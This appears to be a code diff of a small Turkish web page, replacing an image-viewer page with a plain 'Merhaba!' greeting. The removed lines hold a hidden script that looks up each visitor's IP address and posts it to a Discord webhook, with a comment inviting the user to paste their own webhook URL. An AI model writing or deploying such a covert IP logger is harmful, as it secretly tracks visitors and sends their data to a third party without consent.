@@ -1,33 +1,10 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Görsel Göster</title>
+  <meta charset="UTF-8">
+  <title>Merhaba</title>
 </head>
-<body style="margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000;">
-  <img src="fotoğraf.png" alt="Görsel" style="max-width:100%; max-height:100%;" />
-
-  <script>
-    // IP alma ve Discord'a gönderme
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-
-        // BURAYA KENDİ WEBHOOK URL'İNİ YAPIŞTIR
-        const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
-
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            content: `Yeni ziyaretçi IP: ${ip}`
-          })
-        });
-      })
-      .catch(console.error);
-  </script>
+<body>
+  <h1>Merhaba!</h1>
 </body>
 </html>
